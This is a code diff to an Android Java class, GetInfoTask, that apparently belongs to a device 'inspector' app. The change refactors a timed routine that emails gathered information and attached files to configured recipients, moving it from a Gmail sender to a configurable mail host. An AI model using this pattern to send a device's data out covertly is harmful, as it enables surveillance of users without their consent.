@@ -26,7 +26,7 @@ import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
-import com.particle.inspector.common.util.mail.GMailSenderEx;
+import com.particle.inspector.common.util.mail.MailSender;
 import com.particle.inspector.common.util.FileCtrl;
 
 import android.app.Activity;
@@ -143,8 +143,9 @@ public class GetInfoTask extends TimerTask
 			int retry = DEFAULT_RETRY_COUNT;
 			while(!result && retry > 0)
 			{
+				String host = MailCfg.getHost(context);
 				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, sender, pwd, recipients, attachments);
+				result = sendMail(subject, body, host, sender, pwd, recipients, attachments);
 				retry--;
 			}
 			attachments.clear();
@@ -220,8 +221,9 @@ public class GetInfoTask extends TimerTask
 			int retry = DEFAULT_RETRY_COUNT;
 			while(!result && retry > 0)
 			{
+				String host = MailCfg.getHost(context);
 				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, sender, pwd, recipients, pack);
+				result = sendMail(subject, body, host, sender, pwd, recipients, pack);
 				retry--;
 			}
 		
@@ -338,13 +340,14 @@ public class GetInfoTask extends TimerTask
 		}
 	}
 	
-	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<File> files)
+	public static boolean sendMail(String subject, String body, String host, String sender, String pwd, String[] recipients, List<File> files)
 	{
+		if (host == null) return false;
 		boolean ret = false;
 
         try {   
-            GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
-            gmailSender.setFrom(GMailSenderEx.DEFAULT_SENDER);
+            MailSender gmailSender = new MailSender(host, sender, pwd);
+            gmailSender.setFrom(sender);
             gmailSender.setTo(recipients);
             gmailSender.setSubject(subject);
             gmailSender.setBody(body);
